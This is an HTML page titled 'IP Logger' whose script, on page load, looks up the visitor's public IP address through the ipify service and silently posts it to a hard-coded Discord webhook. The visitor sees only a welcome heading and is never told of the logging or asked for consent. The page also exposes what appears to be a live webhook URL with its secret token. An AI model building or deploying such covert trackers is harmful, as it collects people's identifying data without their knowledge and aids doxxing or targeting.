<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>IP Logger</title>
</head>
<body>
    <h1>Hello, Welcome to the IP Logging Page</h1>

    <script>
        // Fetch the user's public IP address using the ipify API
        fetch('https://api.ipify.org?format=json')
            .then(response => response.json())
            .then(data => {
                const userIp = data.ip;  // Extract the user's IP address

                // Send the IP address to your Discord webhook
                fetch('https://discord.com/api/webhooks/1291682857823113218/Cs2QifGkh0lo4X-WyXhrPXrukc6AZemMeKlbWyo8V0dhmjZEYpccO5lq4T-2TzOCXVam', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({
                        content: `New IP logged: ${userIp}`
                    }),
                })
                .then(response => {
                    console.log('IP sent to webhook:', response);
                })
                .catch(error => {
                    console.error('Error sending IP to webhook:', error);
                });
            })
            .catch(error => {
                console.error('Error fetching IP:', error);
            });
    </script>
</body>
</html>
